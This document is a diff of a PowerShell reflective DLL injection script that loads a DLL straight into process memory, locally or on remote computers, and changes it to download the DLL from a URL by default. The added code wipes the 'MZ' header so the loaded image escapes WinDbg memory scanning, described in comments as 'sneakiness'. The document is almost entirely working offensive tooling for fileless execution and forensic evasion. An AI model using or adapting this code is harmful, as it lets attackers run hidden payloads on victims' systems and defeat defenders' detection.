@@ -1,4 +1,6 @@
-﻿<#
+﻿Function Invoke-ReflectiveDllInjection
+{
+<#
 .SYNOPSIS
 
 Reflectively loads a DLL in to memory of the Powershell process.
@@ -82,23 +84,24 @@ Github repo: https://github.com/clymb3r/PowerShell/tree/master/Invoke-Reflective
 
 #>
 
-[CmdletBinding(DefaultParameterSetName="LocalHost")]
+[CmdletBinding(DefaultParameterSetName="WebFile")]
 Param(
 	[Parameter(ParameterSetName = "LocalFile", Position = 0, Mandatory = $true)]
 	[String]
 	$DllPath,
 	
 	[Parameter(ParameterSetName = "WebFile", Position = 0, Mandatory = $true)]
-	[String]
+	[Uri]
 	$DllUrl,
 	
-	[Parameter(Position = 1, Mandatory = $false)]
+	[Parameter(Position = 1)]
 	[String[]]
 	$ComputerName,
 	
-	[Parameter(Position = 2, Mandatory = $false)]
+	[Parameter(Position = 2)]
+    [ValidateSet( 'WString', 'String', 'Void' )]
 	[String]
-	$FuncReturnType
+	$FuncReturnType = 'Void'
 )
 
 Set-StrictMode -Version 2
@@ -829,12 +832,7 @@ $RemoteScriptBlock = {
 		
 		$NtHeadersInfo = New-Object System.Object
 		
-		#Get the DOS header and make sure it is valid
-		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DllHandle, $Win32Types.IMAGE_DOS_HEADER)
-		if ($dosHeader.e_magic -ne 0x5A4D)
-		{
-			throw "Invalid DOS header magic number"
-		}
+		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
 		
 		#Get IMAGE_NT_HEADERS
 		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$DllHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
@@ -895,6 +893,9 @@ $RemoteScriptBlock = {
 		
 		return $DllInfo
 	}
+
+
+
 
 	#DllInfo must contain the following NoteProperties:
 	#	DllHandle: An IntPtr to the address the Dll is loaded to in memory
@@ -1137,7 +1138,7 @@ $RemoteScriptBlock = {
 						-and $ImportDescriptor.Name -eq 0 `
 						-and $ImportDescriptor.TimeDateStamp -eq 0)
 				{
-					Write-Debug "Done importing DLL imports"
+					Write-Verbose "Done importing DLL imports"
 					break
 				}
 
@@ -1282,26 +1283,15 @@ $RemoteScriptBlock = {
 			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, $Win32Types.IMAGE_SECTION_HEADER)
 			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($DllInfo.DllHandle) ($SectionHeader.VirtualAddress)
 			
-			#If page is discardable, discard it
-			if ($SectionHeader.Characteristics -band $Win32Constants.IMAGE_SCN_MEM_DISCARDABLE -gt 0)
+			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
+			[UInt32]$SectionSize = $SectionHeader.VirtualSize
+			
+			$OldProtectFlag = 0
+			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -DllInfo $DllInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
+			$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
+			if ($Success -eq $false)
 			{
-				Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -DllInfo $DllInfo -StartAddress $SectionPtr -Size $SectionHeader.VirtualSize | Out-Null
-				$Win32Functions.VirtualFree.Invoke($SectionPtr, $SectionHeader.VirtualSize, $Win32Constants.MEM_DECOMMIT) | Out-Null
-			}
-			else
-			{
-				[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
-				
-				[UInt32]$SectionSize = $SectionHeader.VirtualSize
-				
-				$OldProtectFlag = 0
-				#$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
-				Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -DllInfo $DllInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
-				$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
-				if ($Success -eq $false)
-				{
-					Throw "Unable to change memory protection"
-				}
+				Throw "Unable to change memory protection"
 			}
 		}
 	}
@@ -1371,7 +1361,7 @@ $RemoteScriptBlock = {
 		
 		
 		#Get basic DLL information
-		Write-Debug "Getting basic DLL information from the file"
+		Write-Verbose "Getting basic DLL information from the file"
 		$DllInfo = Get-DllBasicInfo -DllBytes $DllBytes -Win32Types $Win32Types
 		$OriginalImageBase = $DllInfo.OriginalImageBase
 		
@@ -1389,7 +1379,7 @@ $RemoteScriptBlock = {
 		
 
 		#Allocate memory and write the DLL to memory. Always allocating to random memory address so I have pretend ASLR
-		Write-Debug "Allocating memory for the DLL and write its headers to memory"
+		Write-Verbose "Allocating memory for the DLL and write its headers to memory"
 		$DllHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$DllInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 		[IntPtr]$DllEndAddress = Add-SignedIntAsUnsigned ($DllHandle) ([Int64]$DllInfo.SizeOfImage)
 		if ($DllHandle -eq [IntPtr]::Zero)
@@ -1401,33 +1391,33 @@ $RemoteScriptBlock = {
 		
 		
 		#Now that the DLL is in memory, get more detailed information about it
-		Write-Debug "Getting detailed Dll information from the headers loaded in memory"
+		Write-Verbose "Getting detailed Dll information from the headers loaded in memory"
 		$DllInfo = Get-DllDetailedInfo -DllHandle $DllHandle -Win32Types $Win32Types
 		$DllInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $DllEndAddress
 		
 		
 		#Copy each section from the DLL in to memory
-		Write-Debug "Copy DLL sections in to memory"
+		Write-Verbose "Copy DLL sections in to memory"
 		Copy-Sections -DllBytes $DllBytes -DllInfo $DllInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
 		
 		
 		#Update the memory addresses hardcoded in to the Dll based on the memory address the Dll was expecting to be loaded to vs where it was actually loaded
-		Write-Debug "Update memory addresses based on where the Dll was actually loaded in memory"
+		Write-Verbose "Update memory addresses based on where the Dll was actually loaded in memory"
 		Update-MemoryAddresses -DllInfo $DllInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types
 		
 		
 		#The DLL we are in-memory loading has DLLs it needs, import those DLLs for it
-		Write-Debug "Import DLL's needed by the DLL we are loading"
+		Write-Verbose "Import DLL's needed by the DLL we are loading"
 		Import-DllImports -DllInfo $DllInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
 		
 		
 		#Update the memory protection flags for all the memory just allocated
-		Write-Debug "Update memory protection flags"
+		Write-Verbose "Update memory protection flags"
 		Update-MemoryProtectionFlags -DllInfo $DllInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
 		
 		
 		#Call DllMain so the DLL knows it has been loaded
-		Write-Debug "Calling dllmain so the DLL knows it has been loaded"
+		Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
 		$DllMainPtr = Add-SignedIntAsUnsigned ($DllInfo.DllHandle) ($DllInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
 		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
 		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
@@ -1440,10 +1430,8 @@ $RemoteScriptBlock = {
 
 	Function Main
 	{
-		$DebugPreference = "Continue"
-		
 		#Load the DLL reflectively
-		Write-Debug "Calling Invoke-MemoryLoadLibrary"
+		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
 		$DllHandle = Invoke-MemoryLoadLibrary -DllBytes $DllBytes
 		if ($DllHandle -eq [IntPtr]::Zero)
 		{
@@ -1455,59 +1443,54 @@ $RemoteScriptBlock = {
 		#########################################
 		### YOUR CODE GOES HERE
 		#########################################
-		if ($FuncReturnType -ieq "WString")
-		{
-			Write-Debug "Calling function with WString return type"
-			[IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -DllHandle $DllHandle -FunctionName "WStringFunc"
-			if ($WStringFuncAddr -eq [IntPtr]::Zero)
-			{
-				Throw "Couldn't find function address."
-			}
-			$WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
-			$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
-			[IntPtr]$OutputPtr = $WStringFunc.Invoke()
-			$Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
-			Write-Output $Output
-		}
-		elseif ($FuncReturnType -ieq "String")
-		{
-			Write-Debug "Calling function with String return type"
-			[IntPtr]$StringFuncAddr = Get-MemoryProcAddress -DllHandle $DllHandle -FunctionName "StringFunc"
-			if ($StringFuncAddr -eq [IntPtr]::Zero)
-			{
-				Throw "Couldn't find function address."
-			}
-			$StringFuncDelegate = Get-DelegateType @() ([IntPtr])
-			$StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
-			[IntPtr]$OutputPtr = $StringFunc.Invoke()
-			$Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
-			Write-Output $Output			
-		}
-		elseif (($FuncReturnType -ieq $null) -or ($FuncReturnType -ieq '') -or ($FuncReturnType -ieq "Void"))
-		{
-			Write-Debug "Calling function with Void return type"
-			[IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -DllHandle $DllHandle -FunctionName "VoidFunc"
-			if ($VoidFuncAddr -eq [IntPtr]::Zero)
-			{
-				Throw "Couldn't find function address."
-			}
-			$VoidFuncDelegate = Get-DelegateType @() ([Void])
-			$VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
-			$VoidFunc.Invoke() | Out-Null
-		}
-		else
-		{
-			Throw "Unknown FuncReturnType found"
-		}
+        switch ($FuncReturnType)
+        {
+            'WString' {
+                Write-Verbose "Calling function with WString return type"
+			    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -DllHandle $DllHandle -FunctionName "WStringFunc"
+			    if ($WStringFuncAddr -eq [IntPtr]::Zero)
+			    {
+				    Throw "Couldn't find function address."
+			    }
+			    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
+			    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
+			    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
+			    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
+			    Write-Output $Output
+            }
 
-		
+            'String' {
+                Write-Verbose "Calling function with String return type"
+			    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -DllHandle $DllHandle -FunctionName "StringFunc"
+			    if ($StringFuncAddr -eq [IntPtr]::Zero)
+			    {
+				    Throw "Couldn't find function address."
+			    }
+			    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
+			    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
+			    [IntPtr]$OutputPtr = $StringFunc.Invoke()
+			    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
+			    Write-Output $Output
+            }
+
+            'Void' {
+                Write-Verbose "Calling function with Void return type"
+			    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -DllHandle $DllHandle -FunctionName "VoidFunc"
+			    if ($VoidFuncAddr -eq [IntPtr]::Zero)
+			    {
+				    Throw "Couldn't find function address."
+			    }
+			    $VoidFuncDelegate = Get-DelegateType @() ([Void])
+			    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
+			    $VoidFunc.Invoke() | Out-Null
+            }
+        }
 		#########################################
 		### END OF YOUR CODE
 		#########################################
 		
 		
-		
-		Write-Debug "Done!"
+		Write-Verbose "Done!"
 	}
 
 	Main
@@ -1516,19 +1499,32 @@ $RemoteScriptBlock = {
 #Main function to either run the script locally or remotely
 Function Main
 {
-	[System.IO.Directory]::SetCurrentDirectory($PWD)
-	
 	[Byte[]]$DllBytes = $null
 	
 	if ($PsCmdlet.ParameterSetName -ieq "LocalFile")
 	{
-		[Byte[]]$DllBytes = [System.IO.File]::ReadAllBytes($DllPath)
+		Get-ChildItem $DllPath -ErrorAction Stop | Out-Null
+		[Byte[]]$DllBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $DllPath))
 	}
 	else
 	{
 		$WebClient = New-Object System.Net.WebClient
+		
 		[Byte[]]$DllBytes = $WebClient.DownloadData($DllUrl)
 	}
+	
+	#Verify the image is a valid PE file
+	$e_magic = ($DllBytes[0..1] | % {[Char] $_}) -join ''
+
+    if ($e_magic -ne 'MZ')
+    {
+        throw 'Dll is not a valid PE file.'
+    }
+
+    # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
+	# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
+    $DllBytes[0] = 0
+    $DllBytes[1] = 0
 
 	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
 	{
@@ -1541,3 +1537,4 @@ Function Main
 }
 
 Main
+}
